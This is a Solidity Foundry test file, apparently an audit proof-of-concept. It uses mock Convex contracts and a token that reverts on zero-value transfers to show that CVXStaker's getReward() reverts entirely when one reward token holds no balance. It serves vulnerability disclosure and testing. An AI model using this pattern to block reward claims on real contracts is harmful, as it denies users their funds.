// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {DSTest} from "ds-test/test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console} from "forge-std/console.sol";
import {CVXStaker} from "src/CVXStaker.sol";
import {ICVXBooster} from "src/interfaces/ICVXBooster.sol";
import {IBaseRewardPool} from "src/interfaces/IBaseRewardPool.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";

/// @dev Simple mintable ERC20 token for testing
contract MintableERC20 is ERC20, Ownable {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }
}

/// @dev Malicious ERC20 token that reverts on zero-value transfers
/// This simulates the behavior described in the vulnerability where some
/// ERC20 implementations revert on zero value transfers
contract MaliciousERC20 is MintableERC20 {
    constructor(string memory name, string memory symbol) MintableERC20(name, symbol) {}

    /// @dev Override transfer to revert on zero amount
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if (amount == 0) {
            revert("MaliciousERC20: zero transfer not allowed");
        }
        return super.transfer(to, amount);
    }

    /// @dev Override transferFrom to revert on zero amount
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (amount == 0) {
            revert("MaliciousERC20: zero transfer not allowed");
        }
        return super.transferFrom(from, to, amount);
    }
}

/// @dev Mock CVX Booster for testing
contract MockCVXBooster is ICVXBooster {
    mapping(uint256 => ICVXBooster.PoolInfo) public poolInfos;

    function setPoolInfo(uint256 _pid, ICVXBooster.PoolInfo memory _info) external {
        poolInfos[_pid] = _info;
    }

    function poolInfo(uint256 _pid) external view override returns (ICVXBooster.PoolInfo memory) {
        return poolInfos[_pid];
    }

    function deposit(uint256 _pid, uint256 _amount, bool _stake) external override returns (bool) {
        return true;
    }

    function depositAll(uint256 _pid, bool _stake) external override returns (bool) {
        return true;
    }

    function withdraw(uint256 _pid, uint256 _amount) external override returns (bool) {
        return true;
    }

    function withdrawAll(uint256 _pid) external override returns (bool) {
        return true;
    }
}

/// @dev Mock Base Reward Pool for testing
contract MockBaseRewardPool is IBaseRewardPool {
    address public rewardTokenAddress;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public earnings;

    constructor(address _rewardToken) {
        rewardTokenAddress = _rewardToken;
    }

    function stake(uint256 _amount) external override returns (bool) {
        balances[msg.sender] += _amount;
        return true;
    }

    function stakeAll() external override returns (bool) {
        return true;
    }

    function stakeFor(address _for, uint256 _amount) external override returns (bool) {
        balances[_for] += _amount;
        return true;
    }

    function withdraw(uint256 amount, bool claim) external override {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
    }

    function withdrawAll(bool claim) external override {
        balances[msg.sender] = 0;
    }

    function withdrawAndUnwrap(uint256 amount, bool claim) external override returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        return true;
    }

    function withdrawAllAndUnwrap(bool claim) external override {
        balances[msg.sender] = 0;
    }

    function earned(address account) external view override returns (uint256) {
        return earnings[account];
    }

    function getReward(address _account, bool _claimExtras) external override returns (bool) {
        // Simulate earning some rewards
        earnings[_account] = 100;
        return true;
    }

    function getReward() external override returns (bool) {
        return true;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return balances[account];
    }

    function rewardToken() external view override returns (address) {
        return rewardTokenAddress;
    }
}

contract ExploitTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    CVXStaker internal cvxStaker;
    MockCVXBooster internal mockBooster;
    MockBaseRewardPool internal mockRewardPool;
    MaliciousERC20 internal maliciousToken;
    MintableERC20 internal normalToken;
    MintableERC20 internal clpToken;

    address internal owner;
    address internal operator;
    address internal rewardsRecipient;

    function setUp() public {
        // Create test addresses
        owner = address(0x1);
        operator = address(0x2);
        rewardsRecipient = address(0x3);

        vm.label(owner, "owner");
        vm.label(operator, "operator");
        vm.label(rewardsRecipient, "rewardsRecipient");

        // Create tokens (test contract will be the owner)
        clpToken = new MintableERC20("CLP Token", "CLP");
        maliciousToken = new MaliciousERC20("Malicious Token", "MAL");
        normalToken = new MintableERC20("Normal Token", "NORM");

        vm.label(address(clpToken), "clpToken");
        vm.label(address(maliciousToken), "maliciousToken");
        vm.label(address(normalToken), "normalToken");

        // Create mock contracts
        mockBooster = new MockCVXBooster();
        mockRewardPool = new MockBaseRewardPool(address(normalToken));

        vm.label(address(mockBooster), "mockBooster");
        vm.label(address(mockRewardPool), "mockRewardPool");

        // Set up pool info in booster
        ICVXBooster.PoolInfo memory poolInfo = ICVXBooster.PoolInfo({
            lptoken: address(clpToken),
            token: address(clpToken),
            gauge: address(0x4),
            crvRewards: address(mockRewardPool),
            stash: address(0x5),
            shutdown: false
        });
        mockBooster.setPoolInfo(1, poolInfo);

        // Create reward tokens array with malicious token
        address[] memory rewardTokens = new address[](2);
        rewardTokens[0] = address(maliciousToken);
        rewardTokens[1] = address(normalToken);

        // Deploy CVXStaker
        vm.startPrank(owner);
        cvxStaker = new CVXStaker(
            operator,
            clpToken,
            mockBooster,
            rewardTokens
        );

        // Set CVX pool info
        cvxStaker.setCvxPoolInfo(1, address(clpToken), address(mockRewardPool));

        // Set rewards recipient
        cvxStaker.setRewardsRecipient(rewardsRecipient);

        vm.stopPrank();

        vm.label(address(cvxStaker), "cvxStaker");
    }

    /// @dev Test demonstrating the vulnerability: getReward() fails when a reward token
    /// has zero balance and reverts on zero-value transfers
    function testGetRewardZeroAmountTransferVulnerability() public {
        // Mint some normal tokens to the CVXStaker contract
        normalToken.mint(address(cvxStaker), 100e18);

        // Verify that malicious token has zero balance in CVXStaker
        uint256 maliciousBalance = maliciousToken.balanceOf(address(cvxStaker));
        assertEq(maliciousBalance, 0, "Malicious token should have zero balance");

        // Verify that normal token has some balance in CVXStaker
        uint256 normalBalance = normalToken.balanceOf(address(cvxStaker));
        assertTrue(normalBalance > 0, "Normal token should have non-zero balance");

        // The vulnerability: calling getReward() should revert because
        // maliciousToken.safeTransfer() with zero amount will revert
        vm.expectRevert("MaliciousERC20: zero transfer not allowed");
        cvxStaker.getReward(false);
    }

    /// @dev Test showing that getReward() works when all tokens have non-zero balances
    function testGetRewardWithNonZeroBalances() public {
        // Mint tokens to the CVXStaker contract
        maliciousToken.mint(address(cvxStaker), 50e18);
        normalToken.mint(address(cvxStaker), 100e18);

        // Verify both tokens have non-zero balances
        uint256 maliciousBalance = maliciousToken.balanceOf(address(cvxStaker));
        uint256 normalBalance = normalToken.balanceOf(address(cvxStaker));
        assertTrue(maliciousBalance > 0, "Malicious token should have non-zero balance");
        assertTrue(normalBalance > 0, "Normal token should have non-zero balance");

        // This should work because all transfers have non-zero amounts
        cvxStaker.getReward(false);

        // Verify rewards were transferred to recipient
        assertEq(maliciousToken.balanceOf(rewardsRecipient), 50e18, "Malicious rewards should be transferred");
        assertEq(normalToken.balanceOf(rewardsRecipient), 100e18, "Normal rewards should be transferred");
    }

    /// @dev Test demonstrating the impact: even if only one token has zero balance,
    /// the entire getReward() operation fails
    function testPartialZeroBalanceBlocksEntireOperation() public {
        // Mint only normal tokens, leave malicious token at zero balance
        normalToken.mint(address(cvxStaker), 100e18);

        // Verify malicious token has zero balance but normal token has balance
        assertEq(maliciousToken.balanceOf(address(cvxStaker)), 0, "Malicious token should have zero balance");
        assertTrue(normalToken.balanceOf(address(cvxStaker)) > 0, "Normal token should have non-zero balance");

        // The entire operation fails due to the zero-balance malicious token
        vm.expectRevert("MaliciousERC20: zero transfer not allowed");
        cvxStaker.getReward(false);

        // Verify that no rewards were transferred (operation completely failed)
        assertEq(normalToken.balanceOf(rewardsRecipient), 0, "No rewards should be transferred");
    }
}